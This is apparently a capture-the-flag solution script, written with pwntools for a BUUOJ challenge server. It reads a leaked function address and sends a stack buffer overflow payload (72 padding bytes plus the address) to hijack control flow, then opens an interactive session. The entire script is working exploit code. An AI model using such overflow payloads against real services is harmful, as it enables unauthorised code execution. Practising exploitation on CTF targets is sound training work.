from pwn import *

func = 0x40060D

p = remote('node5.buuoj.cn', 27066)

# p.sendline(b'a' * 64 + b'b' * 8 + p64(func))
# p.interactive()


p.recvuntil('WOW:0x')  # 接收到指定字符串停止
fun = int(p.recvline(), 16)
p.sendline(b'a' * 64 + b'b' * 8 + p64(fun))
p.interactive()
